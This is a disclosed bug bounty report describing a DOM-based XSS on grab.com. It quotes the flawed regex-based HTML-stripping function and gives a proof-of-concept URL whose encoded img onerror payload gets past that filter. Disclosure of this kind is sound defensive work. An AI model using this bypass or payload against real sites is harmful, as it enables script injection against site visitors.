# Dom based xss affecting all pages from https://www.grab.com/.

## Report Details
- **Report ID**: 247246
- **URL**: https://hackerone.com/reports/247246
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-07-08T17:18:20.693Z
- **Disclosed**: 2017-08-17T19:51:18.812Z

## Reporter
- **Username**: netfuzzer
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: grab

## Vulnerability Information
Hello,

there's a dom based xss vulnerability affecting all pages under the domain https://www.grab.com/.
This vulnerability wasn't properly patched so I managed to bypass the regular expressioned that was added into the function.

Vulnerable code:
````
var stripHtml = (function () {
		  var div = document.createElement('div');
		  return function (html) {
		    div.innerHTML = html.replace(/<\/?\w+[^>]*\/?>/g, "");
		    return (div.innerText || div.textContent); // textContent is for firefox
		  };
		})();
``````

PoC: https://www.grab.com/sg/partnerships/?xss=%3C%3Ca/%3A%3C%22a%22%3Eimg%20src%3D%23%20onerror%3Dconfirm%28%27XSSED%27%29%3E

visit url above to reproduce.

A screenshot is attached to this report.

cheers,
Mario.

## Attachments
- screenshot.png
